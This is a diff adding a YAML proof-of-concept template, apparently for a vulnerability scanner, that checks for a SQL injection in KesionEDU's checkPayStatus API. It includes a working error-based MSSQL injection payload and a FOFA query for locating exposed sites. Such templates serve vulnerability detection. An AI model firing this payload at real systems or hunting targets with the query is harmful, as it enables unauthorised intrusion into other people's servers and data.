@@ -1,0 +1,22 @@
+id: poc-yaml-kesion-edu-checkpaystatus-sqli
+info:
+  name: 科汛网校KesionEDU checkPayStatus SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 科汛网校KesionEDU
+  fofa: body="/KS_Inc/static/edu"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: POST
+  path: /Webapi/Common/checkPayStatus
+  headers:
+    Content-Type: application/json
+  data: '{"payorderid":"1'' AND 9173 IN (SELECT (sys.fn_varbintohexstr(hashbytes(''MD5'',''{{.t1}}''))))
+    AND ''rhYc''=''rhYc","apptoken":"1"}'
+  expression: status_code == 500 && contains(body,"System.Data.SqlClient.SqlException")
+    && matches(body,"转换成数据类型(.*?)时失败") && matches(body,"在将(.*?)值") && contains(body,"0x"
+    + t2)
+transport: http
